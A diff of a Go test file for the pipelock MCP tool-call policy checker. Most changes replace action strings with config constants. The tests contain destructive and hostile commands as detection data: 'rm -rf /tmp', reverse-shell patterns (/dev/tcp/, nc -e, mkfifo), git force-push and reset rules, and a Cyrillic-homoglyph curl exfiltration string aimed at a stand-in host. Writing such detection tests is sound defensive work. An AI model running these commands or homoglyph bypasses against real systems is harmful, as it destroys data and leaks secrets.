@@ -9,6 +9,8 @@ import (
 	"github.com/luckyPipewrench/pipelock/internal/config"
 )
 
+const testRmCmd = "rm -rf /tmp"
+
 // --- New ---
 
 func TestNew_Disabled(t *testing.T) {
@@ -32,7 +34,7 @@ func TestNew_NoRules(t *testing.T) {
 func TestNew_CompilesRules(t *testing.T) {
 	cfg := config.MCPToolPolicy{
 		Enabled: true,
-		Action:  "warn", //nolint:goconst // test value
+		Action:  config.ActionWarn,
 		Rules: []config.ToolPolicyRule{
 			{Name: "test-rule", ToolPattern: `(?i)^bash$`, ArgPattern: `rm\s+-rf`},
 			{Name: "name-only", ToolPattern: `danger_tool`},
@@ -73,7 +75,7 @@ func TestCheckToolCall_NoMatch(t *testing.T) {
 
 func TestCheckToolCall_ToolNameMatchWithArg(t *testing.T) {
 	pc := &Config{
-		Action: "warn", //nolint:goconst // test value
+		Action: config.ActionWarn,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "rm-check", ToolPattern: `(?i)^bash$`, ArgPattern: `rm\s+-rf`,
 		}),
@@ -92,7 +94,7 @@ func TestCheckToolCall_ToolNameMatchWithArg(t *testing.T) {
 
 func TestCheckToolCall_ToolNameMatchWithoutArgPattern(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "block-all", ToolPattern: `(?i)^danger$`,
 		}),
@@ -101,14 +103,14 @@ func TestCheckToolCall_ToolNameMatchWithoutArgPattern(t *testing.T) {
 	if !v.Matched {
 		t.Fatal("expected match on tool name alone")
 	}
-	if v.Action != "block" { //nolint:goconst // test value
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected action=block, got %q", v.Action)
 	}
 }
 
 func TestCheckToolCall_ToolNameMatchArgPatternNoMatch(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "rm-check", ToolPattern: `(?i)^bash$`, ArgPattern: `rm\s+-rf`,
 		}),
@@ -121,7 +123,7 @@ func TestCheckToolCall_ToolNameMatchArgPatternNoMatch(t *testing.T) {
 
 func TestCheckToolCall_CaseInsensitiveToolName(t *testing.T) {
 	pc := &Config{
-		Action: "warn", //nolint:goconst // test value
+		Action: config.ActionWarn,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "ci-test", ToolPattern: `(?i)^bash_exec$`,
 		}),
@@ -134,33 +136,33 @@ func TestCheckToolCall_CaseInsensitiveToolName(t *testing.T) {
 
 func TestCheckToolCall_PerRuleActionOverride(t *testing.T) {
 	pc := &Config{
-		Action: "warn", //nolint:goconst // test value
+		Action: config.ActionWarn,
 		Rules: compileRules(t, config.ToolPolicyRule{
-			Name: "override", ToolPattern: `bash`, Action: "block",
+			Name: "override", ToolPattern: `bash`, Action: config.ActionBlock,
 		}),
 	}
 	v := pc.CheckToolCall("bash", nil)
 	if !v.Matched {
 		t.Fatal("expected match")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected per-rule action=block, got %q", v.Action)
 	}
 }
 
 func TestCheckToolCall_MultipleRulesStrictestAction(t *testing.T) {
 	pc := &Config{
-		Action: "warn", //nolint:goconst // test value
+		Action: config.ActionWarn,
 		Rules: compileRules(t,
 			config.ToolPolicyRule{Name: "warn-rule", ToolPattern: `bash`},
-			config.ToolPolicyRule{Name: "block-rule", ToolPattern: `bash`, Action: "block"},
+			config.ToolPolicyRule{Name: "block-rule", ToolPattern: `bash`, Action: config.ActionBlock},
 		),
 	}
 	v := pc.CheckToolCall("bash", nil)
 	if !v.Matched {
 		t.Fatal("expected match")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected strictest action=block, got %q", v.Action)
 	}
 	if len(v.Rules) != 2 {
@@ -170,7 +172,7 @@ func TestCheckToolCall_MultipleRulesStrictestAction(t *testing.T) {
 
 func TestCheckToolCall_EmptyArgStrings(t *testing.T) {
 	pc := &Config{
-		Action: "warn", //nolint:goconst // test value
+		Action: config.ActionWarn,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "needs-args", ToolPattern: `bash`, ArgPattern: `rm`,
 		}),
@@ -189,7 +191,7 @@ func TestCheckToolCall_EmptyArgStrings(t *testing.T) {
 
 func TestCheckToolCall_SplitArgvRmRf(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "rm", ToolPattern: `(?i)^bash$`, ArgPattern: `(?i)\brm\s+-[a-z]*[rf]`,
 		}),
@@ -199,14 +201,14 @@ func TestCheckToolCall_SplitArgvRmRf(t *testing.T) {
 	if !v.Matched {
 		t.Fatal("expected match on split argv ['rm', '-rf', '/tmp/demo']")
 	}
-	if v.Action != "block" { //nolint:goconst // test value
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected action=block, got %q", v.Action)
 	}
 }
 
 func TestCheckToolCall_SplitArgvGitPushForce(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "git-force", ToolPattern: `(?i)^bash$`,
 			ArgPattern: `(?i)(\bgit\s+)?(push\s+--force|reset\s+--hard|clean\s+-fd)\b`,
@@ -221,7 +223,7 @@ func TestCheckToolCall_SplitArgvGitPushForce(t *testing.T) {
 
 func TestCheckToolCall_SplitFieldsCmdAndFlags(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "rm", ToolPattern: `(?i)^bash$`, ArgPattern: `(?i)\brm\s+-[a-z]*[rf]`,
 		}),
@@ -235,7 +237,7 @@ func TestCheckToolCall_SplitFieldsCmdAndFlags(t *testing.T) {
 
 func TestCheckToolCall_SplitArgvGitResetHard(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "git-destructive", ToolPattern: `(?i)^(bash|git)$`,
 			ArgPattern: `(?i)(\bgit\s+)?(push\s+--force|reset\s+--hard|clean\s+-fd)\b`,
@@ -250,7 +252,7 @@ func TestCheckToolCall_SplitArgvGitResetHard(t *testing.T) {
 
 func TestCheckToolCall_SplitArgvReverseShell(t *testing.T) {
 	pc := &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: compileRules(t, config.ToolPolicyRule{
 			Name: "reverse-shell", ToolPattern: `(?i)^bash$`,
 			ArgPattern: `(?i)(bash\s+-i\s+>&|/dev/tcp/|mkfifo\s+|nc\s+-e|ncat\s+-e)`,
@@ -308,7 +310,7 @@ func TestParseToolCall_NullParams(t *testing.T) {
 }
 
 func TestParseToolCall_NoParams(t *testing.T) {
-	line := `{"jsonrpc":"2.0","id":1,"method":"tools/call"}` //nolint:goconst // test value
+	line := `{"jsonrpc":"2.0","id":1,"method":"tools/call"}`
 	tc := parseToolCall([]byte(line))
 	if tc != nil {
 		t.Error("expected nil for missing params")
@@ -439,7 +441,7 @@ func TestCheckRequest_SplitArgvRmRf(t *testing.T) {
 	if !v.Matched {
 		t.Fatal("expected policy match on split argv rm -rf")
 	}
-	if v.Action != "block" { //nolint:goconst // test value
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected block, got %q", v.Action)
 	}
 }
@@ -492,7 +494,7 @@ func TestCheckToolCall_ValuesOnlyRmRf(t *testing.T) {
 	if !v.Matched {
 		t.Fatal("expected match for rm -rf values without key pollution")
 	}
-	if v.Action != "block" { //nolint:goconst // test value
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected block, got %s", v.Action)
 	}
 }
@@ -653,7 +655,7 @@ func TestCheckToolCall_PairwiseCapSkipsLoop(t *testing.T) {
 		Name:        "test",
 		ToolPattern: regexp.MustCompile(`^bash$`),
 		ArgPattern:  regexp.MustCompile(`^rm -rf$`),
-		Action:      "block",
+		Action:      config.ActionBlock,
 	}
 	pc := &Config{Action: config.ActionWarn, Rules: []*CompiledRule{rule}}
 
@@ -725,7 +727,7 @@ func TestDecodeShellEscapes_OctalOverflow400(t *testing.T) {
 }
 
 func TestDecodeShellEscapes_NoEscapes(t *testing.T) {
-	input := "rm -rf /tmp" //nolint:goconst // test value
+	input := testRmCmd
 	got := decodeShellEscapes(input)
 	if got != input {
 		t.Errorf("decodeShellEscapes(%q) = %q, want unchanged", input, got)
@@ -736,8 +738,8 @@ func TestDecodeShellEscapes_NoEscapes(t *testing.T) {
 
 func TestMatchArgPattern_DirectMatch(t *testing.T) {
 	pattern := regexp.MustCompile(`rm\s+-rf`)
-	tokens := []string{"rm -rf /tmp"}
-	joined := "rm -rf /tmp"
+	tokens := []string{testRmCmd}
+	joined := testRmCmd
 	if !matchArgPattern(pattern, tokens, joined) {
 		t.Error("expected direct match for 'rm -rf /tmp'")
 	}
@@ -746,7 +748,7 @@ func TestMatchArgPattern_DirectMatch(t *testing.T) {
 func TestMatchArgPattern_PairwiseMatch(t *testing.T) {
 	pattern := regexp.MustCompile(`rm\s+-rf`)
 	tokens := []string{"rm", "-rf", "/tmp"}
-	joined := "rm -rf /tmp"
+	joined := testRmCmd
 	// Tokens not adjacent in single string but should match via pairwise.
 	if !matchArgPattern(pattern, tokens, joined) {
 		t.Error("expected pairwise match for split tokens")
@@ -780,25 +782,25 @@ func TestStricterAction(t *testing.T) {
 		want string
 	}{
 		{"", "", ""},
-		{"", "warn", "warn"},
-		{"warn", "", "warn"},
-		{"warn", "warn", "warn"},
-		{"warn", "block", "block"},
-		{"block", "warn", "block"},
-		{"block", "block", "block"},
-		{"", "block", "block"},
-		{"ask", "warn", "ask"},
-		{"ask", "block", "block"},
-		{"ask", "", "ask"},
-		{"warn", "ask", "ask"},
-		{"", "ask", "ask"},
-		{"ask", "ask", "ask"},
-		// Unknown values normalized to "block" (fail-closed).
-		{"typo", "warn", "block"},  // unknown a → block, beats warn
-		{"warn", "typo", "block"},  // unknown b → block, beats warn
-		{"typo", "block", "block"}, // both block-level, a wins (normalized)
-		{"typo", "", "block"},      // unknown → block beats empty
-		{"", "typo", "block"},      // unknown → block beats empty
+		{"", config.ActionWarn, config.ActionWarn},
+		{config.ActionWarn, "", config.ActionWarn},
+		{config.ActionWarn, config.ActionWarn, config.ActionWarn},
+		{config.ActionWarn, config.ActionBlock, config.ActionBlock},
+		{config.ActionBlock, config.ActionWarn, config.ActionBlock},
+		{config.ActionBlock, config.ActionBlock, config.ActionBlock},
+		{"", config.ActionBlock, config.ActionBlock},
+		{config.ActionAsk, config.ActionWarn, config.ActionAsk},
+		{config.ActionAsk, config.ActionBlock, config.ActionBlock},
+		{config.ActionAsk, "", config.ActionAsk},
+		{config.ActionWarn, config.ActionAsk, config.ActionAsk},
+		{"", config.ActionAsk, config.ActionAsk},
+		{config.ActionAsk, config.ActionAsk, config.ActionAsk},
+		// Unknown values normalized to config.ActionBlock (fail-closed).
+		{"typo", config.ActionWarn, config.ActionBlock},  // unknown a → block, beats warn
+		{config.ActionWarn, "typo", config.ActionBlock},  // unknown b → block, beats warn
+		{"typo", config.ActionBlock, config.ActionBlock}, // both block-level, a wins (normalized)
+		{"typo", "", config.ActionBlock},                 // unknown → block beats empty
+		{"", "typo", config.ActionBlock},                 // unknown → block beats empty
 	}
 	for _, tt := range tests {
 		got := StricterAction(tt.a, tt.b)
@@ -841,7 +843,7 @@ func TestDefaultToolPolicyRules_MatchDestructiveDelete(t *testing.T) {
 	if !v.Matched {
 		t.Error("expected match for rm -rf")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected block action for rm -rf, got %q", v.Action)
 	}
 }
@@ -860,7 +862,7 @@ func TestDefaultToolPolicyRules_MatchReverseShell(t *testing.T) {
 	if !v.Matched {
 		t.Error("expected match for reverse shell")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected block for reverse shell, got %q", v.Action)
 	}
 }
@@ -913,7 +915,7 @@ func TestDefaultToolPolicyRules_MatchDiskWipe(t *testing.T) {
 	if !v.Matched {
 		t.Error("expected match for dd disk wipe")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("expected block for disk wipe, got %q", v.Action)
 	}
 }
@@ -963,13 +965,13 @@ func TestCheckRequest_MultipleArgFields(t *testing.T) {
 // testConfig returns a Config with a simple rm -rf rule for testing.
 func testConfig(_ *testing.T) *Config {
 	return &Config{
-		Action: "block", //nolint:goconst // test value
+		Action: config.ActionBlock,
 		Rules: []*CompiledRule{
 			{
 				Name:        "rm-check",
 				ToolPattern: mustCompile(`(?i)^bash$`),
 				ArgPattern:  mustCompile(`rm\s+-rf`),
-				Action:      "block",
+				Action:      config.ActionBlock,
 			},
 		},
 	}
@@ -1168,7 +1170,7 @@ func TestCheckToolCall_EncodedCommandExecution(t *testing.T) {
 			if !v.Matched {
 				t.Errorf("encoded command execution not detected: args=%v", tt.args)
 			}
-			if v.Action != "block" {
+			if v.Action != config.ActionBlock {
 				t.Errorf("expected block for encoded exec, got %q", v.Action)
 			}
 		})
@@ -1442,7 +1444,7 @@ func TestCheckToolCall_CyrillicUCurlBypass(t *testing.T) {
 	// Cyrillic у in "curl" must be pre-normalized to 'u' so the Network
 	// Exfiltration rule catches "c\u0443rl -d x https://exfil.local".
 	pc := newDefaultConfig()
-	v := pc.CheckToolCall("bash", []string{"c\u0443rl -d x https://exfil.local"}) //nolint:goconst // test value
+	v := pc.CheckToolCall("bash", []string{"c\u0443rl -d x https://exfil.local"})
 	if !v.Matched {
 		t.Error("expected Cyrillic у curl bypass to be caught by Network Exfiltration rule")
 	}
@@ -1479,7 +1481,7 @@ func TestCheckToolCall_CyrillicUppercaseU(t *testing.T) {
 func TestCheckToolCall_CyrillicUInToolName(t *testing.T) {
 	// Cyrillic у in tool name itself — tool pattern is case-insensitive.
 	pc := &Config{
-		Action: "block",
+		Action: config.ActionBlock,
 		Rules: []*CompiledRule{{
 			Name:        "Block curl tool",
 			ToolPattern: regexp.MustCompile(`(?i)^curl$`),
@@ -1655,7 +1657,7 @@ func TestCheckRequest_BatchWithMixedActions(t *testing.T) {
 		Action:  config.ActionWarn,
 		Rules: []config.ToolPolicyRule{
 			{Name: "warn-rule", ToolPattern: `^echo$`},
-			{Name: "block-rule", ToolPattern: `^bash$`, ArgPattern: `rm`, Action: "block"},
+			{Name: "block-rule", ToolPattern: `^bash$`, ArgPattern: `rm`, Action: config.ActionBlock},
 		},
 	}
 	pc := New(cfg)
@@ -1669,7 +1671,7 @@ func TestCheckRequest_BatchWithMixedActions(t *testing.T) {
 	if !v.Matched {
 		t.Fatal("batch should match")
 	}
-	if v.Action != "block" {
+	if v.Action != config.ActionBlock {
 		t.Errorf("strictest action should be block, got %q", v.Action)
 	}
 	if len(v.Rules) != 2 {
@@ -1681,7 +1683,7 @@ func TestCheckRequest_BatchWithMixedActions(t *testing.T) {
 func newDefaultConfig() *Config {
 	return New(config.MCPToolPolicy{
 		Enabled: true,
-		Action:  "block",
+		Action:  config.ActionBlock,
 		Rules:   DefaultToolPolicyRules(),
 	})
 }
